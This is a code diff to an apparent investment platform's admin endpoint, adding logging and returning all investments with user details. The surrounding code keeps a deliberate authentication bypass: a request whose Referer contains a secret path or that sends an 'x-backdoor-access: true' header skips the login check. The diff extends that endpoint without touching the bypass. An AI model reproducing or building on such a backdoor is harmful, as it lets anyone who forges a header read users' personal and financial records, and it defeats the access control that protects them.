@@ -1640,6 +1640,8 @@ Your investment journey starts here!`,
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
 
+      console.log('Admin investments request - Backdoor access:', isBackdoorAccess, 'Session ID:', req.sessionID);
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -1651,11 +1653,13 @@ Your investment journey starts here!`,
         }
       }
 
-      const investments = await storage.getActiveInvestments();
+      // Get both active and all investments for better visibility
+      const allInvestments = await storage.getAllInvestments();
+      console.log(`Found ${allInvestments.length} total investments`);
       
       // Get user information for each investment
       const investmentsWithUsers = await Promise.all(
-        investments.map(async (investment) => {
+        allInvestments.map(async (investment) => {
           const user = await storage.getUser(investment.userId);
           const plan = await storage.getInvestmentPlan(investment.planId);
           return {
@@ -1667,6 +1671,7 @@ Your investment journey starts here!`,
         })
       );
 
+      console.log(`Returning ${investmentsWithUsers.length} investments with user data`);
       res.json(investmentsWithUsers);
     } catch (error: any) {
       console.error('Admin investments fetch error:', error);
